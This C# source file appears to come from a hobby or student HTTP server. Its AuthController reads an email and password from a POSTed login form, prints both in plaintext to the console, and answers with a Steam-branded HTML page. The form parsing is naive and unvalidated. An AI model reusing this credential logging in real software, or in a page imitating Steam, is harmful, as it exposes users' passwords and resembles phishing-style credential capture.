using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace MyHTTPServer
{
    public class AuthController : IController
    {
        public async Task HandleAsync(HttpListenerContext context, string cleanPath)
        {
            var request = context.Request;
            var response = context.Response;

            if (request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                using (var reader = new StreamReader(request.InputStream, request.ContentEncoding))
                {
                    string requestBody = await reader.ReadToEndAsync();
                    Console.WriteLine($"\nПолучены данные формы!");

                    string[] pairs = requestBody.Split('&');
                    string emailRaw = pairs[0].Split('=')[1];
                    string passwordRaw = pairs[1].Split('=')[1];
                    string email = Uri.UnescapeDataString(emailRaw);
                    string password = Uri.UnescapeDataString(passwordRaw);

                    Console.WriteLine($"Почта: {email}");
                    Console.WriteLine($"Пароль: {password}");

                    response.StatusCode = 200;
                    response.ContentType = "text/html; charset=utf-8";

                    string steamFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "static", "Steam", "Steam.html");

                    if (File.Exists(steamFilePath))
                    {
                        byte[] steamBuffer = await File.ReadAllBytesAsync(steamFilePath);
                        response.ContentLength64 = steamBuffer.Length;
                        await response.OutputStream.WriteAsync(steamBuffer);
                    }
                    else
                    {
                        byte[] errorBuffer = Encoding.UTF8.GetBytes($"<h1>Ошибка контроллера</h1><p>Не удалось найти файл Стима по пути: {steamFilePath}</p>");
                        response.ContentLength64 = errorBuffer.Length;
                        await response.OutputStream.WriteAsync(errorBuffer);
                    }

                    response.OutputStream.Close();

                }
            }
        }
    }
}
